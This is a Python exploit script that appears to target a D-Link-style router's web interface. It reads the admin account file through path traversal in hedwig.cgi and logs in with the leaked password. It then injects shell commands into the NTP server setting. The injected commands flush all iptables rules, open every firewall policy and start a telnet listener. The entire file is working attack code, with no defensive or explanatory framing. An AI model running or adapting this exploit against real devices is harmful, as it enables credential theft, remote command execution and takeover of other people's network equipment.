#!/usr/bin/env python3
# pylint: disable=C0103
#
# pip3 install requests lxml
#
import hmac
import json
import sys
from urllib.parse import urljoin
from xml.sax.saxutils import escape
import lxml.etree
import requests

try:
    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
except:
    pass

TARGET = sys.argv[1]
COMMAND = ";".join([
    "iptables -F",
    "iptables -X",
    "iptables -t nat -F",
    "iptables -t nat -X",
    "iptables -t mangle -F",
    "iptables -t mangle -X",
    "iptables -P INPUT ACCEPT",
    "iptables -P FORWARD ACCEPT",
    "iptables -P OUTPUT ACCEPT",
    "telnetd -p 23090 -l /bin/date"  # port 'Z2'
    ])

session = requests.Session()
session.verify = False

############################################################

print("Get password...")

headers = {"Content-Type": "text/xml"}
cookies = {"uid": "whatever"}
data = """<?xml version="1.0" encoding="utf-8"?>
<postxml>
<module>
    <service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service>
</module>
</postxml>"""

resp = session.post(urljoin(TARGET, "/hedwig.cgi"), headers=headers, cookies=cookies, data=data)
# print(resp.text)

# getcfg: <module>...</module>
# hedwig: <?xml version="1.0" encoding="utf-8"?>
#       : <hedwig>...</hedwig>
accdata = resp.text[:resp.text.find("<?xml")]

admin_pasw = ""

tree = lxml.etree.fromstring(accdata)
accounts = tree.xpath("/module/device/account/entry")
for acc in accounts:
    name = acc.findtext("name", "")
    pasw = acc.findtext("password", "")
    print("name:", name)
    print("pass:", pasw)
    if name == "Admin":
        admin_pasw = pasw

if not admin_pasw:
    print("Admin password not found!")
    sys.exit()

############################################################

print("Auth challenge...")
resp = session.get(urljoin(TARGET, "/authentication.cgi"))
# print(resp.text)

resp = json.loads(resp.text)
if resp["status"].lower() != "ok":
    print("Failed!")
    print(resp.text)
    sys.exit()

print("uid:", resp["uid"])
print("challenge:", resp["challenge"])

session.cookies.update({"uid": resp["uid"]})

print("Auth login...")
user_name = "Admin"
user_pasw = admin_pasw

data = {
    "id": user_name,
    "password": hmac.new(user_pasw.encode(), (user_name + resp["challenge"]).encode(), "md5").hexdigest().upper()
}
resp = session.post(urljoin(TARGET, "/authentication.cgi"), data=data)
# print(resp.text)

resp = json.loads(resp.text)
if resp["status"].lower() != "ok":
    print("Failed!")
    print(resp.text)
    sys.exit()
print("OK")

############################################################

data = {"SERVICES": "DEVICE.TIME"}
resp = session.post(urljoin(TARGET, "/getcfg.php"), data=data)
# print(resp.text)

tree = lxml.etree.fromstring(resp.content)
tree.xpath("//ntp/enable")[0].text = "1"
tree.xpath("//ntp/server")[0].text = "metelesku; (" + COMMAND + ") & exit; "
tree.xpath("//ntp6/enable")[0].text = "1"

############################################################

print("hedwig")

headers = {"Content-Type": "text/xml"}
data = lxml.etree.tostring(tree)
resp = session.post(urljoin(TARGET, "/hedwig.cgi"), headers=headers, data=data)
# print(resp.text)

tree = lxml.etree.fromstring(resp.content)
result = tree.findtext("result")
if result.lower() != "ok":
    print("Failed!")
    print(resp.text)
    sys.exit()
print("OK")

############################################################

print("pigwidgeon")

data = {"ACTIONS": "SETCFG,ACTIVATE"}
resp = session.post(urljoin(TARGET, "/pigwidgeon.cgi"), data=data)
# print(resp.text)

tree = lxml.etree.fromstring(resp.content)
result = tree.findtext("result")
if result.lower() != "ok":
    print("Failed!")
    print(resp.text)
    sys.exit()
print("OK")